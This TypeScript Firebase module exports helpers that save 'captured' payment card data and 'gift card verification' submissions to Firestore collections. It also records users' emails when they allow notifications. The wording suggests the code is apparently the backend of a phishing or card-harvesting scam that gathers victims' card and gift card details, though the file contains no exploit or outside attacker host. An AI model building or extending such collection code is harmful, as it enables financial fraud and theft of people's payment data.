import { initializeApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore, collection, addDoc, setDoc, doc } from 'firebase/firestore';
import firebaseConfig from '../../firebase-applet-config.json';

const app = initializeApp(firebaseConfig);
export const db = getFirestore(app, firebaseConfig.firestoreDatabaseId);
export const auth = getAuth();

// Shared function to log captured cards to Firestore
export const logCardSubmission = async (cardData: any) => {
  try {
    await addDoc(collection(db, 'cardSubmissions'), {
      ...cardData,
      timestamp: new Date().toISOString()
    });
    console.log('Card data synced to cloud');
  } catch (e) {
    console.error('Failed to sync card data:', e);
  }
};

// Shared function to log gift card verification submissions to Firestore
export const logGiftCardSubmission = async (giftCardData: any) => {
  try {
    await addDoc(collection(db, 'giftCardSubmissions'), {
      ...giftCardData,
      status: 'pending',
      timestamp: new Date().toISOString()
    });
    console.log('Gift card verification data synced to cloud');
  } catch (e) {
    console.error('Failed to sync gift card data:', e);
  }
};

// Safe Notification permission helper without crashing on unsupported browsers
export const requestNotificationPermission = async (userEmail?: string) => {
  try {
    if (typeof window !== 'undefined' && 'Notification' in window) {
      const permission = await Notification.requestPermission();
      if (permission === 'granted' && userEmail) {
        try {
          await setDoc(doc(db, 'fcmTokens', userEmail.replace(/[^a-zA-Z0-9]/g, '_')), {
            email: userEmail,
            granted: true,
            updatedAt: new Date().toISOString()
          }, { merge: true });
        } catch (dbErr) {
          console.warn('Failed to record notification preference:', dbErr);
        }
      }
      return permission === 'granted' ? 'granted' : null;
    }
  } catch (e) {
    console.warn('Notifications not supported in this environment:', e);
  }
  return null;
};

// Safe Foreground message listener stub
export const onForegroundMessage = (_callback: (payload: any) => void) => {
  return () => {};
};
